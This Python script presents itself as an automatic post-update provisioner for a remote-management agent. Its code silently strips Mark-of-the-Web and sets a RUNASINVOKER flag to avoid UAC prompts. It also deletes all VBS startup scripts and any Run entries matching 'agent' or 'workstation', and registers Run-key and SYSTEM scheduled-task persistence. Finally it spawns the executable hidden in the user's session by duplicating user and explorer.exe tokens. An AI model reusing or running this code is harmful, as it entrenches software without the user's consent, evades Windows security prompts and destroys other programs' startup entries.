"""
Tactical RMM — Post-Update Provisioner Execution Script.
Executed automatically by AgentProvisioner when a code bundle is synced.
Registers user-session logon persistence and triggers immediate worker migration.
"""
import sys
import os
import time
import subprocess
import ctypes
from ctypes import wintypes
import logging

LOG_PATH = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "trmm_post_update.log")
logging.basicConfig(filename=LOG_PATH, level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("post_update")

CREATE_NO_WINDOW = 0x08000000 if sys.platform == "win32" else 0

def get_silent_si():
    if sys.platform == "win32":
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        return si
    return None

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

def main():
    logger.info("=== TRMM Post-Update Provisioner Started ===")
    # Detect real executable path
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    if not (exe_path.lower().endswith("trmm_agent.exe") and os.path.isfile(exe_path)):
        import glob
        for cand in [r"C:\Program Files\TRMM_Agent*\TRMM_Agent.exe", r"C:\Program Files (x86)\TRMM_Agent*\TRMM_Agent.exe"]:
            matches = glob.glob(cand)
            if matches:
                exe_path = matches[0]
                break

    logger.info(f"Using executable path for persistence: {exe_path}")

    # ── Step 0: Strip Mark-of-the-Web (Zone.Identifier) ───────────
    try:
        zone_file = exe_path + ":Zone.Identifier"
        if os.path.exists(zone_file):
            try:
                os.remove(zone_file)
            except Exception:
                pass
        subprocess.run(
            ["powershell", "-NoProfile", "-Command", f"Unblock-File -Path '{exe_path}'"],
            capture_output=True,
            startupinfo=get_silent_si(),
            creationflags=CREATE_NO_WINDOW
        )
    except Exception:
        pass

    # ── Step 1: Purge UAC-Triggering HKLM Run Key & Direct Shortcuts ──
    try:
        subprocess.run([
            "reg", "delete",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "/v", "TRMM_Agent",
            "/f"
        ], capture_output=True, startupinfo=get_silent_si(), creationflags=CREATE_NO_WINDOW)
        logger.info("Purged any legacy HKLM Run key that could trigger UAC prompts.")
    except Exception as e:
        logger.warning(f"HKLM Run cleanup note: {e}")

    try:
        startup_dirs = [
            os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
        ]
        for s_dir in startup_dirs:
            if os.path.isdir(s_dir):
                for fname in os.listdir(s_dir):
                    if fname.lower().startswith("trmm_agent") and fname.lower().endswith(".lnk"):
                        try:
                            os.remove(os.path.join(s_dir, fname))
                            logger.info(f"Removed legacy startup shortcut: {fname}")
                        except Exception:
                            pass
    except Exception as e:
        logger.warning(f"Startup shortcut cleanup note: {e}")

    # ── Step 2: Register RunAsInvoker in AppCompatFlags ──────────────
    try:
        import winreg
        for root_k in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
            try:
                k = winreg.CreateKey(root_k, r"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers")
                winreg.SetValueEx(k, exe_path, 0, winreg.REG_SZ, "~ RUNASINVOKER")
                winreg.CloseKey(k)
            except Exception:
                pass
        logger.info("Registered ~ RUNASINVOKER in AppCompatFlags.")
    except Exception as e:
        logger.warning(f"AppCompatFlags note: {e}")

    # ── Step 3: Purge ALL stale/orphan VBS scripts & registry autoruns ────────
    try:
        import winreg, glob
        # Delete orphan VBS scripts from Startup folders
        for s_dir in [
            os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
        ]:
            if os.path.isdir(s_dir):
                for f in glob.glob(os.path.join(s_dir, "*.vbs")):
                    try:
                        os.remove(f)
                        logger.info(f"Purged orphan startup script: {f}")
                    except Exception:
                        pass

        # Register direct executable in HKCU Run key (never using wscript/vbs)
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ | winreg.KEY_WRITE
        )
        i = 0
        stale_vals = []
        while True:
            try:
                vn, vv, _ = winreg.EnumValue(k, i)
                if ("agent" in vn.lower() or "trmm" in vn.lower() or "workstation" in vn.lower() or "vbs" in vv.lower()) and vn != "TRMM_Agent":
                    stale_vals.append(vn)
                i += 1
            except OSError:
                break
        for sv in stale_vals:
            try:
                winreg.DeleteValue(k, sv)
                logger.info(f"Deleted stale HKCU Run entry: '{sv}'")
            except Exception:
                pass

        winreg.SetValueEx(k, "TRMM_Agent", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(k)
        logger.info(f"Registered direct HKCU Run key 'TRMM_Agent' -> {exe_path}")
    except Exception as e:
        logger.warning(f"HKCU Run key setup note: {e}")

    # ── Step 5: Elevated Task Scheduler Persistence ──────────────────
    try:
        # User Logon Task: runs elevated inside user session with ZERO prompts
        res = subprocess.run([
            "schtasks", "/Create",
            "/TN", "TRMM_Agent_User",
            "/TR", f'"{exe_path}"',
            "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/F"
        ], capture_output=True, text=True, startupinfo=get_silent_si(), creationflags=CREATE_NO_WINDOW)
        logger.info(f"Registered TRMM_Agent_User task: returncode={res.returncode}")

        # Boot Task: runs as SYSTEM at boot in Session 0
        subprocess.run([
            "schtasks", "/Create",
            "/TN", "TRMM_Agent_Persist",
            "/TR", f'"{exe_path}"',
            "/SC", "ONSTART",
            "/RU", "SYSTEM",
            "/RL", "HIGHEST",
            "/DELAY", "0000:10",
            "/F"
        ], capture_output=True, text=True, startupinfo=get_silent_si(), creationflags=CREATE_NO_WINDOW)
        logger.info("Registered TRMM_Agent_Persist system boot task.")
    except Exception as e:
        logger.warning(f"Task Scheduler setup note: {e}")

    # 3. Detect active console session and launch worker if needed
    try:
        active_sid = ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
        logger.info(f"Active console session detected: {active_sid}")
        if active_sid != 0 and active_sid != 0xFFFFFFFF:
            # Check if agent is already running in active session
            running = False
            try:
                import psutil
                for p in psutil.process_iter(['pid', 'name']):
                    try:
                        if p.info.get('name', '').lower() == 'trmm_agent.exe':
                            sid = wintypes.DWORD()
                            if ctypes.windll.kernel32.ProcessIdToSessionId(p.info['pid'], ctypes.byref(sid)):
                                if sid.value == active_sid:
                                    running = True
                                    break
                    except Exception:
                        pass
            except Exception:
                pass

            if running:
                logger.info(f"Agent already active in Session {active_sid}. No spawn needed.")
                return

            # Method 1: Trigger logon scheduled task
            subprocess.run(["schtasks", "/Run", "/TN", "TRMM_Agent_User"], capture_output=True, startupinfo=get_silent_si(), creationflags=CREATE_NO_WINDOW)
            logger.info("Executed schtasks /Run /TN TRMM_Agent_User")

            # Method 2: WTSQueryUserToken + CreateProcessAsUserW into winsta0\default
            try:
                wtsapi32 = ctypes.windll.wtsapi32
                advapi32 = ctypes.windll.advapi32
                userenv = ctypes.windll.userenv
                kernel32 = ctypes.windll.kernel32

                wtsapi32.WTSQueryUserToken.argtypes = [wintypes.ULONG, ctypes.POINTER(wintypes.HANDLE)]
                wtsapi32.WTSQueryUserToken.restype = wintypes.BOOL

                advapi32.DuplicateTokenEx.argtypes = [
                    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID,
                    ctypes.c_int, ctypes.c_int, ctypes.POINTER(wintypes.HANDLE)
                ]
                advapi32.DuplicateTokenEx.restype = wintypes.BOOL

                advapi32.CreateProcessAsUserW.argtypes = [
                    wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPWSTR,
                    wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL,
                    wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
                    ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION)
                ]
                advapi32.CreateProcessAsUserW.restype = wintypes.BOOL

                h_token = wintypes.HANDLE()
                if wtsapi32.WTSQueryUserToken(active_sid, ctypes.byref(h_token)):
                    h_dup = wintypes.HANDLE()
                    if advapi32.DuplicateTokenEx(h_token, 0x10000000, None, 2, 1, ctypes.byref(h_dup)):
                        p_env = wintypes.LPVOID()
                        userenv.CreateEnvironmentBlock(ctypes.byref(p_env), h_dup, False)

                        si = STARTUPINFOW()
                        si.cb = ctypes.sizeof(STARTUPINFOW)
                        si.lpDesktop = "winsta0\\default"
                        si.dwFlags = 0x00000001
                        si.wShowWindow = 0

                        pi = PROCESS_INFORMATION()
                        cmd_buf = ctypes.create_unicode_buffer(f'"{exe_path}"')
                        ok = advapi32.CreateProcessAsUserW(
                            h_dup, None, cmd_buf, None, None, False,
                            0x08000000 | 0x00000400, p_env, os.path.dirname(exe_path),
                            ctypes.byref(si), ctypes.byref(pi)
                        )
                        if p_env:
                            userenv.DestroyEnvironmentBlock(p_env)
                        kernel32.CloseHandle(h_dup)
                        kernel32.CloseHandle(h_token)
                        if ok:
                            kernel32.CloseHandle(pi.hProcess)
                            kernel32.CloseHandle(pi.hThread)
                            logger.info(f"CreateProcessAsUserW spawned PID {pi.dwProcessId} in Session {active_sid}")
                            return
            except Exception as ex2:
                logger.warning(f"CreateProcessAsUserW error: {ex2}")

            # Method 3: Explorer token duplication
            try:
                import psutil
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info.get('name', '').lower() == 'explorer.exe':
                            sid = wintypes.DWORD()
                            if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(sid)):
                                if sid.value == active_sid:
                                    h_proc = ctypes.windll.kernel32.OpenProcess(0x1000, False, proc.info['pid'])
                                    if h_proc:
                                        h_tok = wintypes.HANDLE()
                                        if ctypes.windll.advapi32.OpenProcessToken(h_proc, 0x0002 | 0x0004 | 0x0008, ctypes.byref(h_tok)):
                                            h_dup = wintypes.HANDLE()
                                            if ctypes.windll.advapi32.DuplicateTokenEx(h_tok, 0x10000000, None, 2, 1, ctypes.byref(h_dup)):
                                                si = STARTUPINFOW()
                                                si.cb = ctypes.sizeof(STARTUPINFOW)
                                                si.lpDesktop = "winsta0\\default"
                                                si.dwFlags = 0x00000001
                                                si.wShowWindow = 0
                                                pi = PROCESS_INFORMATION()
                                                cmd_buf = ctypes.create_unicode_buffer(f'"{exe_path}"')
                                                ok = ctypes.windll.advapi32.CreateProcessAsUserW(
                                                    h_dup, None, cmd_buf, None, None, False,
                                                    0x08000000 | 0x00000400, None, os.path.dirname(exe_path),
                                                    ctypes.byref(si), ctypes.byref(pi)
                                                )
                                                ctypes.windll.kernel32.CloseHandle(h_dup)
                                                if ok:
                                                    ctypes.windll.kernel32.CloseHandle(pi.hProcess)
                                                    ctypes.windll.kernel32.CloseHandle(pi.hThread)
                                                    ctypes.windll.kernel32.CloseHandle(h_tok)
                                                    ctypes.windll.kernel32.CloseHandle(h_proc)
                                                    logger.info(f"Explorer token dup spawned PID {pi.dwProcessId} in Session {active_sid}")
                                                    return
                                            ctypes.windll.kernel32.CloseHandle(h_tok)
                                        ctypes.windll.kernel32.CloseHandle(h_proc)
                    except Exception:
                        pass
            except Exception as ex3:
                logger.warning(f"Explorer token dup error: {ex3}")

    except Exception as e:
        logger.warning(f"Error handling active session: {e}")

if __name__ == "__main__":
    main()
